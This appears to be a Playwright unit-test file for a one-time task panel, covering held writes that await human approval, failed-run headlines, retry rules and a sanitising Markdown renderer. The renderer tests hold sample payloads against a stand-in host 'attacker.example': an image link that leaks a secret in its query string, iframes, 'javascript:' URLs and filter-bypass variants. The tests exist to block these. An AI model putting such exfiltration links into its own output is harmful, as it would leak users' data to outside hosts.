import { test, expect } from "@playwright/test";

/**
 * FEAT8: the one-time task panel on `/intelligence`.
 *
 * The `@unit` block tests the pure decisions the panel renders from, with no gateway and no page.
 * Run it alone with a config that has no webServer and `grep: /@unit/`. The route contract itself
 * (compile -> plan -> run once -> held writes -> approve) is proven on both estates by
 * apps/gateway/tests/test_one_time_tasks.py.
 */
import {
  answeredOnly,
  heldWrites,
  readsByConnection,
  runBlocker,
  taskHeadline,
  type OneTimeAction,
  type OneTimeDraft,
  type PlanRead,
  withheldArgs,
} from "../lib/one-time-api";
import { describeValueState, isValueState } from "../lib/value-state";

const action = (id: string, status: OneTimeAction["status"]): OneTimeAction => ({
  action_id: id,
  name: `write_${id}`,
  status,
  by: null,
  automation_mode: "human_required",
  tool: "source.write:c:write_file",
  args: {},
  reversal: null,
  derived_from: [],
  ungrounded_values: [],
  history: [],
});

const draft = (over: Partial<OneTimeDraft> = {}): OneTimeDraft => ({
  draft_id: "once-draft-1",
  runnable: true,
  created_from: "x",
  understood: "",
  open_questions: [],
  assumptions: [],
  notes: [],
  compilation: { outcome: "compiled", refusals: [], reason: "" },
  model_used: false,
  plan: {
    task_id: "once_x",
    title: "x",
    mode: "read_only",
    trigger: "manual",
    sources_read: [],
    reads: [],
    writes: [],
    instructions: "",
    grants: null,
  },
  ...over,
});

test.describe("@unit one-time task helpers (FEAT8)", () => {
  test("a held write is never reported as done, whatever the state field says", () => {
    for (const held of ["proposed", "approved"] as const) {
      const actions = [action("a1", "executed"), action("a2", held)];
      for (const state of ["done", "waiting_for_approval"]) {
        const h = taskHeadline({ state, actions });
        expect(h.tone).toBe("waiting");
        expect(h.text).not.toMatch(/^Done/);
        expect(h.text).toContain(String(heldWrites({ actions }).length));
      }
    }
  });

  test("done counts what was executed and rejected, from the actions", () => {
    const actions = [action("a1", "executed"), action("a2", "executed"), action("a3", "rejected")];
    const ex = actions.filter((a) => a.status === "executed").length;
    const rj = actions.filter((a) => a.status === "rejected").length;
    const h = taskHeadline({ state: "done", actions });
    expect(h.tone).toBe("done");
    expect(h.text).toContain(`${ex} writes executed`);
    expect(h.text).toContain(`${rj} rejected`);
    expect(taskHeadline({ state: "done", actions: [] }).text).toContain("read-only");
    expect(taskHeadline({ state: "refused", actions: [] }).tone).toBe("failed");
    // R-029 Codex f1 #3: a run stopped by a limit is never shown as done
    const stopped = taskHeadline({ state: "stopped", actions: [] });
    expect(stopped.tone).not.toBe("done");
    expect(stopped.text).toContain("Stopped before it finished");
  });

  test("run is blocked by open questions, a refused compile, or no plan — and only then", () => {
    expect(runBlocker(draft())).toBeNull();
    const q = [{ id: "source:slack", text: "Slack is not connected", options: [] }];
    expect(runBlocker(draft({ open_questions: q, runnable: false }))).toContain(String(q.length));
    const refusal = { code: "purpose_unknown", detail: "no such purpose" };
    const refused = runBlocker(
      draft({ runnable: false, compilation: { outcome: "refused", refusals: [refusal], reason: "" } }),
    );
    expect(refused).toContain(refusal.detail);
    expect(runBlocker(draft({ plan: null, runnable: false }))).not.toBeNull();
    expect(runBlocker(draft({ runnable: false }))).not.toBeNull();
  });

  test("only answers to questions that were asked are sent, trimmed", () => {
    const qs = [{ id: "writer:x", text: "which?", options: ["a", "b"] }];
    expect(answeredOnly({ "writer:x": " a ", "mode:x": "autonomous", other: "" }, qs)).toEqual({ "writer:x": "a" });
    expect(answeredOnly({ "writer:x": "   " }, qs)).toEqual({});
  });

  test("reads group by connection, internal tools together, in order", () => {
    const reads: PlanRead[] = [
      { tool: "graph.search", family: "graph", connection: null },
      { tool: "source.query:db", family: "source", connection: "db" },
      { tool: "retrieve.search", family: "retrieve", connection: null },
      { tool: "source.read:db:read_bytes", family: "source", connection: "db" },
    ];
    const groups = readsByConnection(reads);
    expect(groups.map((g) => g.connection)).toEqual([null, "db"]);
    expect(groups.flatMap((g) => g.tools).sort()).toEqual(reads.map((r) => r.tool).sort());
  });
});

// ============================================================================================
// R-027 ONE, Codex round 1: model Markdown cannot load anything; a failed run says so
// ============================================================================================
import * as React from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { canRetry } from "../lib/one-time-api";
import {
  RESOURCE_LOADING_ELEMENTS,
  SAFE_MARKDOWN_ELEMENTS,
  safeMarkdownUrl,
} from "../components/intelligence/safe-markdown-policy";
import { SafeMarkdown } from "../components/intelligence/safe-markdown";

const ATTACKER = "attacker.example";

test.describe("@unit model Markdown is inert (R-027 ONE #2)", () => {
  test("no resource-loading element is on the allow-list", () => {
    expect(SAFE_MARKDOWN_ELEMENTS.length).toBeGreaterThan(0);
    expect(SAFE_MARKDOWN_ELEMENTS.filter((e) => RESOURCE_LOADING_ELEMENTS.includes(e))).toEqual([]);
  });

  test("only in-page and same-origin link targets survive", () => {
    for (const ok of ["#cite-p1", "/provenance?source=x"]) expect(safeMarkdownUrl(ok)).toBe(ok);
    for (const bad of [
      `https://${ATTACKER}/x`,
      `http://${ATTACKER}/x`,
      `//${ATTACKER}/x`,
      "/\\" + ATTACKER + "/x",
      "javascript:alert(1)",
      "java\tscript:alert(1)",
      "data:text/html,<b>x</b>",
      `mailto:a@${ATTACKER}`,
      "",
      null,
    ]) {
      expect(safeMarkdownUrl(bad as string | null)).toBeNull();
    }
  });

  test("an image, a raw tag and an external link render as text, never as a fetch", () => {
    const md = [
      `Answer ![leak](https://${ATTACKER}/i.png?d=SECRET) with a [p1](#cite-p1) citation.`,
      `<img src="https://${ATTACKER}/raw.png"> <iframe src="https://${ATTACKER}/f"></iframe>`,
      `[click me](https://${ATTACKER}/y) and [home](/provenance)`,
    ].join("\n\n");
    const html = renderToStaticMarkup(React.createElement(SafeMarkdown, { children: md }));
    expect(html).not.toContain("<img");
    expect(html).not.toContain("<iframe");
    expect(html).not.toContain(ATTACKER);
    expect(html).toContain("image not loaded: leak");
    expect(html).toContain('href="#cite-p1"');
    expect(html).toContain('href="/provenance"');
    expect(html).toContain("click me");
  });
});

test.describe("@unit a failed one-time run (R-027 ONE #3)", () => {
  test("failed and running are never reported as done, and failed names its reference", () => {
    const failed = taskHeadline({ state: "failed", actions: [], error_ref: "once-err-1" });
    expect(failed.tone).toBe("failed");
    expect(failed.text).toContain("once-err-1");
    const failedHeld = taskHeadline({ state: "failed", actions: [action("a1", "proposed")], error_ref: "r" });
    expect(failedHeld.tone).toBe("failed");
    expect(failedHeld.text).toContain(String(heldWrites({ actions: [action("a1", "proposed")] }).length));
    expect(taskHeadline({ state: "running", actions: [] }).text).not.toMatch(/^Done/);
  });

  test("retry is offered only for a failed task with no write left to decide", () => {
    expect(canRetry({ state: "failed", actions: [] })).toBe(true);
    expect(canRetry({ state: "failed", actions: [action("a1", "rejected")] })).toBe(false);
    expect(canRetry({ state: "failed", actions: [action("a1", "proposed")] })).toBe(false);
    for (const state of ["done", "waiting_for_approval", "running", "not_run"]) {
      expect(canRetry({ state, actions: [] })).toBe(false);
    }
  });
});

test.describe("@unit a failed run's headline counts what happened (R-027 ONE, Codex round 2 #5)", () => {
  test("a failed task never says nothing was written after a write executed", () => {
    const actions = [action("a1", "executed"), action("a2", "rejected")];
    const ex = actions.filter((a) => a.status === "executed").length;
    const rj = actions.filter((a) => a.status === "rejected").length;
    const h = taskHeadline({ state: "failed", actions, error_ref: "r" });
    expect(h.tone).toBe("failed");
    expect(h.text).not.toContain("Nothing was written");
    expect(h.text).toContain(`${ex} write${ex === 1 ? "" : "s"} executed`);
    expect(h.text).toContain(`${rj} rejected`);
    expect(taskHeadline({ state: "failed", actions: [action("a1", "rejected")] }).text).toContain(
      "Nothing was written",
    );
    expect(taskHeadline({ state: "failed", actions: [] }).text).toContain("Nothing was written");
  });
});

test.describe("@unit the standard withheld envelope (R-028 #12)", () => {
  const envelope = { status: "withheld", reason: "no_valid_pointer", pointers: [] };

  test("a write with no pointers shows the envelope, never its values", () => {
    const a = { ...action("a1", "proposed"), args: envelope };
    const w = withheldArgs(a as OneTimeAction);
    expect(w).toEqual(envelope);
    expect(describeValueState(w!)).toMatch(/^Withheld: no source is recorded/);
  });

  test("args that merely look like an envelope but carry pointers are a value", () => {
    const a = {
      ...action("a1", "proposed"),
      args: envelope,
      derived_from: [{ source_id: "s", kind: "table_cell" }],
    };
    expect(withheldArgs(a as unknown as OneTimeAction)).toBeNull();
    expect(withheldArgs(action("a2", "proposed"))).toBeNull();
  });

  test("the envelope check is strict", () => {
    expect(isValueState(envelope)).toBe(true);
    expect(isValueState({ status: "absent", reason: "x" })).toBe(true);
    for (const v of [
      null,
      [],
      "withheld",
      { status: "withheld" },
      { status: "redacted", reason: "x" },
      { status: "withheld", reason: "x", path: "a.md" },
      { status: "withheld", reason: "x", pointers: "p" },
    ]) {
      expect(isValueState(v)).toBe(false);
    }
  });
});
